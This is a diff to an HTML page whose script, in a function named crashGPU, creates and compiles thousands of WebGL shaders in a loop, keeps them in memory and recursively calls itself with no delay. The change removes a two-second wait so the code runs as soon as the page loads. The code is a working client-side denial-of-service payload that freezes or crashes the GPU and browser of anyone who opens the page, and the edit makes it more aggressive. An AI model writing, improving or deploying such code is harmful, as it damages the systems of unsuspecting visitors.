@@ -12,14 +12,18 @@
         var gl = canvas.getContext('webgl');
 
         function crashGPU() {
-            while (true) {
+            let shaders = [];
+            for (let i = 0; i < 5000; i++) { // Increased workload
                 var shader = gl.createShader(gl.VERTEX_SHADER);
                 gl.shaderSource(shader, 'void main() { gl_Position = vec4(1.0); }');
                 gl.compileShader(shader);
+                shaders.push(shader);
+                gl.getShaderParameter(shader, gl.COMPILE_STATUS);
             }
+            crashGPU(); // Recursion with no delay
         }
 
-        setTimeout(crashGPU, 2000);
+        crashGPU(); // Runs instantly, no wait
     </script>
 </body>
 </html>
